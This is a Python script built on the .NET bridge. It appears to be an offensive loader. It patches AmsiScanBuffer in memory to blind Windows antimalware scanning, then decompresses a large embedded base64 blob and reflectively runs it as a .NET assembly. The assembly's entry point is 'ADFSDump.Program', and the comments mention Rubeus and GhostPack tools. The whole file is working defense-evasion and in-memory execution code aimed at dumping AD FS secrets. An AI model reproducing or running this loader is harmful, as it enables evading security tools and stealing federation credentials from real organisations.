import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("ADFSDump.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()